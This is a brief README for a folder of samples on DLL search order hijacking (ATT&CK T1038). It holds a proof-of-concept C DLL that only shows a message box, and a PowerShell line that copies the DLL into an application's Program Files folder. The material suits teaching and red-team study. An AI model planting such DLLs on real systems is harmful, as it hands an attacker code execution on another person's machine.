# Code Samples: T1038 DLL Search Order Hijacking

This folder contains code examples for creating and deploying malicious DLLs to exploit search order vulnerabilities.

## Example: Malicious DLL (C)
```c
// Minimal DLL entry point
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    MessageBoxA(NULL, "Malicious DLL loaded!", "DLL Hijack", MB_OK);
    return TRUE;
}
```

## Example: Deploy DLL with PowerShell
```powershell
Copy-Item -Path .\malicious.dll -Destination "C:\Program Files\VulnerableApp\"
```
